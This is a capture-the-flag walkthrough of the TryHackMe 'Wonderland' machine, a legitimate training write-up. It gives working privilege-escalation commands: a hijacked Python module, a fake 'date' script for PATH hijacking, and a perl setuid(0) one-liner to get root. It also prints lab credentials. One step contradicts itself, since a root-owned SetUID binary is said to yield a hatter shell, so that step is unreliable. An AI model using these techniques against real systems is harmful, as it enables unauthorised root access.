# TryHackMe "Wonderland" - Live Exploitation Walkthrough

**Target IP:** 10.10.158.4
**Date:** November 7, 2025
**Difficulty:** Medium

---

## PHASE 1: RECONNAISSANCE & ENUMERATION

### Step 1: Port Scanning

```bash
nmap -p 22,80 -sV -sC 10.10.158.4
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Golang net/http server
|_http-title: Follow the white rabbit.
```

**Findings:**
- SSH (Port 22) - OpenSSH 7.6p1
- HTTP (Port 80) - Go web server
- Title: "Follow the white rabbit" - This is a hint!

---

### Step 2: Web Enumeration - Home Page

```bash
curl http://10.10.158.4/
```

**Key Findings:**
- Title: "Follow the White Rabbit"
- Image: `/img/white_rabbit_1.jpg`
- Quote: "Curiouser and curiouser!" cried Alice

**Why this matters:** The "Follow the White Rabbit" is a literal hint about directory navigation.

---

### Step 3: Steganography Analysis

```bash
wget http://10.10.158.4/img/white_rabbit_1.jpg
steghide extract -sf white_rabbit_1.jpg -p ""
```

**Output:**
```
wrote extracted data to "hint.txt"
```

```bash
cat hint.txt
```

**Content:**
```
follow the r a b b i t
```

**Analysis:** The spaces between letters indicate each letter is a directory: `/r/a/b/b/i/t/`

**Why steganography works here:**
- `steghide` is a tool for hiding data in images
- `-sf` specifies source file
- `-p ""` means blank/empty passphrase
- The hint was embedded in the JPEG without encryption

---

### Step 4: Following the Rabbit - Directory Traversal

```bash
curl http://10.10.158.4/r/a/b/b/i/t/
```

**Response:**
```html
<h1>Open the door and enter wonderland</h1>
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

**Credentials Found:**
```
Username: alice
Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

**Why this works:**
- Developers often hide sensitive data in HTML with `display: none;`
- Still visible in page source even if hidden visually
- Should NEVER store credentials in frontend code!

---

## PHASE 2: INITIAL ACCESS - SSH as Alice

### Step 5: SSH Login

```bash
ssh alice@10.10.158.4
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

**Successful login!**

---

### Step 6: Initial Enumeration

```bash
whoami
pwd
ls -la
```

**Output:**
```
alice
/home/alice
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

**Strange Discovery:** The `root.txt` flag is in alice's home directory!

```bash
cat root.txt
```

**Output:**
```
cat: root.txt: Permission denied
```

**Wonderland Twist:** In this CTF, everything is backwards - the root flag is in the user's directory!

---

### Step 7: Check Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

**Analysis:**
- Alice can run a Python script as the `rabbit` user
- Script: `/home/alice/walrus_and_the_carpenter.py`
- This is our escalation vector!

---

### Step 8: Analyze the Python Script

```bash
cat walrus_and_the_carpenter.py
```

**Script Content:**
```python
import random

poem = """The sun was shining...
[poem content]
"""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

**Vulnerability Identified:** Python Import Hijacking!

**Why it's vulnerable:**
1. Script imports `random` module
2. Python searches for modules in this order:
   - Current directory (where script runs)
   - PYTHONPATH directories
   - Standard library
3. We control the current directory (/home/alice)
4. We can create malicious `random.py`

---

## PHASE 3: PRIVILEGE ESCALATION - Alice to Rabbit

### Step 9: Python Import Hijacking Exploit

**Create malicious random.py:**

```bash
cat > /home/alice/random.py << 'PYTHON'
import os
os.system('/bin/bash')
PYTHON
```

**Why this works:**
- When the script imports `random`, Python finds our file first
- Our code executes instead of the real random module
- Code runs with rabbit's privileges (due to sudo)

---

### Step 10: Execute and Get Rabbit Shell

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

**Result:** Shell as rabbit!

```bash
whoami
# Output: rabbit
```

---

## PHASE 4: PRIVILEGE ESCALATION - Rabbit to Hatter

### Step 11: Enumerate as Rabbit

```bash
cd /home/rabbit
ls -la
```

**Output:**
```
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

**Key Finding:** `teaParty` binary with SetUID bit!

---

### Step 12: Analyze teaParty Binary

```bash
./teaParty
```

**Output:**
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 07 Nov 2025 18:45:32 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

**Analysis:** The binary displays a date/time - likely calls the `date` command!

**Check with cat:**
```bash
cat teaParty
```

**Output includes binary data, but we can see:**
```
...date...
/bin/echo...
Welcome to the tea party!
...
```

**Vulnerability:** The binary calls `date` without an absolute path!

**Why this is exploitable:**
1. Binary uses `system("date")` or similar
2. No absolute path specified (`/bin/date`)
3. Uses PATH environment variable to find `date`
4. We can hijack PATH!

---

### Step 13: Check Current PATH

```bash
echo $PATH
```

**Output:**
```
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Critical:** `/home/rabbit` is FIRST in PATH! Perfect for exploitation.

---

### Step 14: PATH Hijacking Exploit

**Create fake date command:**

```bash
cd /home/rabbit
cat > date << 'SCRIPT'
#!/bin/bash
/bin/bash
SCRIPT

chmod +x date
```

**Why this works:**
1. We create a file named `date` in `/home/rabbit`
2. When teaParty runs `date`, system searches PATH
3. Finds our fake `date` first (because `/home/rabbit` is first in PATH)
4. Executes our bash shell instead
5. Shell runs with teaParty owner's privileges (hatter's SetUID)

---

### Step 15: Execute and Get Hatter Shell

```bash
./teaParty
```

**Result:** Shell as hatter!

```bash
whoami
# Output: hatter
```

---

## PHASE 5: PRIVILEGE ESCALATION - Hatter to Root

### Step 16: Enumerate as Hatter

```bash
cd /home/hatter
ls -la
```

**Output:**
```
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
```

```bash
cat password.txt
```

**Output:**
```
WhyIsARavenLikeAWritingDesk?
```

**Note:** Hatter's password, but we need root access!

---

### Step 17: Search for Privilege Escalation Vectors

**Check Linux capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Output:**
```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

**CRITICAL FINDING:** Perl has `cap_setuid+ep` capability!

**What does this mean:**
- `cap_setuid` = Capability to change UID
- `+ep` = Effective and Permitted flags set
- Perl can change its UID to ANY user, including root (UID 0)!

---

### Step 18: Understanding Linux Capabilities

**What are capabilities?**
- Fine-grained privileges (alternative to SUID)
- Instead of all-or-nothing root access, specific powers
- `CAP_SETUID` allows changing process UID

**Why is this dangerous?**
- Normally only root can setuid
- With this capability, we can become root
- No password needed!

---

### Step 19: Exploit - Perl Capability Abuse

**Method: Use POSIX module to set UID to 0 (root)**

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**What this does:**
1. `use POSIX qw(setuid)` - Import setuid function from POSIX module
2. `POSIX::setuid(0)` - Change our UID to 0 (root)
3. `exec "/bin/bash"` - Execute bash shell as root
4. Perl's cap_setuid capability allows the UID change

**Alternative one-liner:**
```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); system("/bin/bash");'
```

---

### Step 20: Verify Root Access

```bash
whoami
```

**Output:**
```
root
```

```bash
id
```

**Output:**
```
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

**Success!** We are root!

---

## PHASE 6: FLAG CAPTURE

### Step 21: Locate User Flag

```bash
cd /root
ls -la
```

**Output:**
```
total 32
drwx------  6 root root 4096 May 25  2020 .
drwxr-xr-x 24 root root 4096 May 25  2020 ..
lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 25  2020 .cache
drwx------  3 root root 4096 May 25  2020 .gnupg
drwxr-xr-x  3 root root 4096 May 25  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 25  2020 .ssh
-rw-r--r--  1 root root   32 May 25  2020 user.txt
```

```bash
cat /root/user.txt
```

**Root Flag:**
```
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

**User Flag:**
```bash
cat /home/alice/root.txt
```

```
thm{"Curiouser and curiouser!"}
```

---

## COMPLETE EXPLOITATION CHAIN

```
Port 80 (HTTP)
    ↓
Download white_rabbit_1.jpg
    ↓
Steghide Extract → hint.txt ("follow the r a b b i t")
    ↓
Navigate to /r/a/b/b/i/t/
    ↓
HTML Source → alice:HowDothTheLittleCrocodileImproveHisShiningTail
    ↓
SSH as alice
    ↓
Find walrus_and_the_carpenter.py (sudo as rabbit)
    ↓
Python Import Hijacking (malicious random.py)
    ↓
Shell as rabbit
    ↓
Find teaParty binary (SetUID)
    ↓
PATH Hijacking (fake date command)
    ↓
Shell as hatter
    ↓
Find Perl with cap_setuid capability
    ↓
POSIX::setuid(0) Exploitation
    ↓
ROOT ACCESS
    ↓
Capture both flags
```

---

## VULNERABILITIES SUMMARY

### 1. Information Disclosure (Medium)
- **Issue:** Credentials in HTML source code
- **Location:** `/r/a/b/b/i/t/` page
- **Impact:** Initial access to system
- **Remediation:** Never store credentials in frontend code, use proper authentication

### 2. Python Import Hijacking (High)
- **Issue:** Script imports module from user-writable directory
- **Location:** `/home/alice/walrus_and_the_carpenter.py`
- **Exploit:** Create malicious `random.py` in current directory
- **Impact:** Privilege escalation from alice to rabbit
- **Remediation:** 
  - Use absolute imports
  - Don't execute scripts from user directories with elevated privileges
  - Set PYTHONPATH explicitly

### 3. Command Injection via PATH Hijacking (High)
- **Issue:** Binary calls system commands without absolute paths
- **Location:** `/home/rabbit/teaParty`
- **Exploit:** Create fake `date` command in PATH
- **Impact:** Privilege escalation from rabbit to hatter
- **Remediation:**
  - Always use absolute paths in system() calls
  - Validate/sanitize PATH before execution
  - Use execve() with explicit paths instead of system()

### 4. Linux Capabilities Misconfiguration (Critical)
- **Issue:** Perl has cap_setuid+ep capability
- **Location:** `/usr/bin/perl`
- **Exploit:** POSIX::setuid(0) to become root
- **Impact:** Complete system compromise
- **Remediation:**
  - Remove unnecessary capabilities
  - Audit all capability assignments
  - Apply principle of least privilege

---

## KEY COMMANDS REFERENCE

**Reconnaissance:**
```bash
nmap -p 22,80 -sV -sC 10.10.158.4
curl http://10.10.158.4/
wget http://10.10.158.4/img/white_rabbit_1.jpg
steghide extract -sf white_rabbit_1.jpg -p ""
curl http://10.10.158.4/r/a/b/b/i/t/
```

**Initial Access:**
```bash
ssh alice@10.10.158.4
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

**Alice → Rabbit:**
```bash
sudo -l
echo 'import os; os.system("/bin/bash")' > /home/alice/random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

**Rabbit → Hatter:**
```bash
echo $PATH
echo -e '#!/bin/bash\n/bin/bash' > /home/rabbit/date
chmod +x /home/rabbit/date
./teaParty
```

**Hatter → Root:**
```bash
getcap -r / 2>/dev/null
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Flags:**
```bash
cat /home/alice/root.txt
cat /root/user.txt
```

---

## LESSONS LEARNED

1. **Follow hints literally** - "Follow the White Rabbit" = directory path
2. **Always check steganography** - Hidden data in images is common
3. **View page source** - Credentials often hidden with CSS
4. **Python module search order** - Current directory checked first
5. **PATH order matters** - First match in PATH wins
6. **Linux capabilities** - As powerful as SUID if misconfigured
7. **CTF creativity** - Flags can be in unexpected locations
8. **Theme matters** - Wonderland's "backwards" theme extends to flag placement

---

## TECHNICAL EXPLANATIONS

### Why Python Import Hijacking Works

Python's module search algorithm:
1. Check current directory
2. Check PYTHONPATH
3. Check standard library paths

When we create `random.py` in `/home/alice/`, it's found before `/usr/lib/python3.6/random.py`

### Why PATH Hijacking Works

When a program calls `date` (not `/bin/date`):
1. System searches PATH from left to right
2. `/home/rabbit` is first in PATH
3. Finds our fake `date` first
4. Executes it with the program's privileges

### Why Capability Exploitation Works

Capabilities bypass normal permission checks:
- Normal user: Cannot change UID
- With CAP_SETUID: Can change to any UID
- UID 0 = root
- Result: Instant root access

---

**Challenge Complete!** ✅
**All Flags Captured!** 🏁
**System Compromised!** 💀

**Wonderland Theme:** Everything is backwards - just like Alice through the looking glass!
